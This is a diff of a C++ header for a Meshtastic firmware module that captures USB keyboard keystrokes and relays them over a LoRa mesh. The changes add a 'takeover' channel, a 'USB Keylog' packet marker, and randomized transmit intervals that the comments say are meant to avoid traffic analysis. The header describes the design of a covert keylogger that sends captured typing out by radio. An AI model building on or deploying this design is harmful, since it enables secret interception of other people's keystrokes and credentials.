@@ -6,12 +6,13 @@
  * makes them available to Core 0 for mesh transmission. Implements proper
  * Meshtastic Module API for remote control and status queries.
  *
- * Architecture:
+ * Architecture (v7.0):
  *  - Inherits from SinglePortModule for mesh message handling
  *  - Inherits from OSThread for periodic USB capture operations
- *  - Uses PRIVATE_APP port (256) for control messages
- *  - Core1: USB capture via PIO → PSRAM ring buffer
- *  - Core0: PSRAM polling → mesh transmission + message handling
+ *  - Uses custom port 490 for keystroke data
+ *  - Uses channel 1 "takeover" with PSK for mesh broadcast
+ *  - Core1: USB capture via PIO → FRAM storage
+ *  - Core0: FRAM polling → mesh transmission + message handling
  *
  * SPDX-License-Identifier: GPL-3.0-only
  */
@@ -42,12 +43,26 @@ extern FRAMBatchStorage *framStorage;
 #define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
 
 /**
- * @brief Transmission and timing configuration constants
+ * @brief Port and channel configuration (v7.0)
+ *
+ * Custom port 490 in private range (256-511) for USB capture protocol.
+ * Channel 1 "takeover" with PSK encryption for mesh broadcast.
  */
-#define MIN_TRANSMIT_INTERVAL_MS  6000      /**< Minimum interval between transmissions (6 seconds) */
-#define STATS_LOG_INTERVAL_MS     10000     /**< Statistics logging interval (10 seconds) */
+#define USB_CAPTURE_PORTNUM       490       /**< Custom port for USB capture (private range 256-511) */
+#define USB_CAPTURE_CHANNEL_INDEX 1         /**< Channel 1 "takeover" for mesh broadcast */
+
+/**
+ * @brief Transmission and timing configuration constants (v7.6)
+ *
+ * Randomized transmission interval (40s-4min) reduces mesh congestion,
+ * avoids traffic analysis, and improves battery usage.
+ * Batches accumulate in FRAM until transmission window.
+ */
+#define TX_INTERVAL_MIN_MS        40000     /**< Minimum interval between transmissions (40 seconds) */
+#define TX_INTERVAL_MAX_MS        240000    /**< Maximum interval between transmissions (4 minutes) */
+#define STATS_LOG_INTERVAL_MS     60000     /**< Statistics logging interval (60 seconds) */
 #define CORE1_LAUNCH_DELAY_MS     100       /**< Delay after Core1 reset before launch */
-#define RUNONCE_INTERVAL_MS       20000     /**< Module runOnce() polling interval (20 seconds) */
+#define RUNONCE_INTERVAL_MS       60000     /**< Module runOnce() polling interval (60 seconds) */
 
 /**
  * @brief ACK-Based Reliable Transmission (v6.0)
@@ -59,6 +74,23 @@ extern FRAMBatchStorage *framStorage;
 #define ACK_MAX_RETRIES           3         /**< Maximum retry attempts before giving up */
 #define ACK_BACKOFF_MULTIPLIER    2         /**< Timeout doubles on each retry */
 #define ACK_MAX_TIMEOUT_MS        120000    /**< Maximum timeout cap (2 minutes) */
+
+/**
+ * @brief Protocol Version Header (REQ-PROTO-001)
+ *
+ * All transmitted batches include a versioned header with magic marker.
+ * Format: [magic:2][version:2][batch_id:4][data:N]
+ * Magic marker enables backwards-compatible detection of old vs new format.
+ *
+ * Detection logic (in receiver):
+ * - If bytes[0..1] == 0x55 0x4B ("UK"), it's new format (parse version, batch_id at offset 4)
+ * - Otherwise, it's old format (batch_id at offset 0, no version)
+ */
+#define USB_CAPTURE_PROTOCOL_MAGIC_0        0x55  /**< Magic byte 0 ('U') */
+#define USB_CAPTURE_PROTOCOL_MAGIC_1        0x4B  /**< Magic byte 1 ('K' for USB Keylog) */
+#define USB_CAPTURE_PROTOCOL_VERSION_MAJOR  1     /**< Major version (breaking changes) */
+#define USB_CAPTURE_PROTOCOL_VERSION_MINOR  0     /**< Minor version (backwards compatible) */
+#define USB_CAPTURE_PROTOCOL_HEADER_SIZE    4     /**< Magic(2) + Version(2) = 4 bytes */
 
 /**
  * @brief Keystroke Simulation Mode (for testing without USB keyboard)
@@ -76,12 +108,34 @@ extern FRAMBatchStorage *framStorage;
 /**
  * @brief Buffer size configuration constants
  */
-#define MAX_DECODED_TEXT_SIZE     600       /**< Maximum size for decoded text buffer */
+#define MAX_DECODED_TEXT_SIZE     233       /**< Maximum size - fits single LoRa packet (v7.2) */
 #define MAX_COMMAND_RESPONSE_SIZE 200       /**< Maximum size for command response text */
 #define MAX_LINE_BUFFER_SIZE      128       /**< Maximum size for log line buffer */
-#define MAX_COMMAND_LENGTH        32        /**< Maximum length for parsed commands */
+#define MAX_COMMAND_LENGTH        64        /**< Maximum length for parsed commands (increased for auth prefix) */
 #define MAX_TEST_PAYLOAD_SIZE     500       /**< Maximum length for TEST command payload */
 #define MAX_CLIENT_NAME_LENGTH    20        /**< Maximum length for client name (e.g., "ste_1234") */
+
+/**
+ * @brief Command Authentication (REQ-SEC-001)
+ *
+ * Protects sensitive commands (START, STOP, TEST) with optional auth token.
+ * Read-only commands (STATUS, STATS, DUMP) allowed without auth.
+ *
+ * Configuration (platformio.ini):
+ *   -DUSB_CAPTURE_AUTH_TOKEN=\"mysecret\"
+ *
+ * Authenticated command format: "AUTH:<token>:<command>"
+ *   Example: "AUTH:mysecret:START"
+ *
+ * If USB_CAPTURE_AUTH_TOKEN is not defined or empty, auth is disabled
+ * and all commands work without the AUTH: prefix (backwards compatible).
+ */
+#ifndef USB_CAPTURE_AUTH_TOKEN
+#define USB_CAPTURE_AUTH_TOKEN ""           /**< Empty = no auth required (backwards compatible) */
+#endif
+#define USB_CAPTURE_AUTH_PREFIX   "AUTH:"   /**< Command prefix for authenticated commands */
+#define USB_CAPTURE_AUTH_PREFIX_LEN 5       /**< Length of "AUTH:" */
+#define USB_CAPTURE_AUTH_MAX_TOKEN_LEN 32   /**< Maximum token length */
 
 /**
  * @brief Character encoding constants
@@ -184,10 +238,16 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
     // ==================== ACK-Based Reliable Transmission (v6.0) ====================
 
     /**
-     * @brief Batch ID counter for ACK correlation
-     * Increments for each batch sent. Persists across power cycles via FRAM header (future).
+     * @brief Batch ID generation (v7.5)
+     *
+     * Batch IDs are generated using RTC + random to ensure uniqueness across:
+     * - Device reboots (RTC component)
+     * - Multiple devices on same channel (random component)
+     * - FRAM clears (no sequential counter to reset)
+     *
+     * Format: Upper 16 bits = RTC seconds, Lower 16 bits = random
+     * Generated inline in processPSRAMBuffers(), no member variable needed.
      */
-    uint32_t nextBatchId = 1;
 
     /**
      * @brief Pending transmission state (single-at-a-time model)
@@ -286,6 +346,29 @@ class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
      * @return Packet ID if queued successfully, 0 if failed or no target
      */
     uint32_t sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId);
+
+    // ==================== Core1 Health Monitoring (REQ-OPS-001) ====================
+
+    /**
+     * @brief Check if Core1 is alive and healthy
+     *
+     * Evaluates Core1 health based on:
+     * - Whether Core1 has started
+     * - USB connection status
+     * - Time since last keystroke capture
+     * - Error count thresholds
+     *
+     * Updates g_core1_health.status based on evaluation.
+     *
+     * @return true if Core1 is operating normally, false if stalled/error
+     */
+    bool isCore1Alive();
+
+    /**
+     * @brief Last time health check was performed (millis)
+     * Used to rate-limit health status updates
+     */
+    uint32_t lastHealthCheckTime = 0;
 
     // ==================== ACK Tracking (v6.0) ====================
 
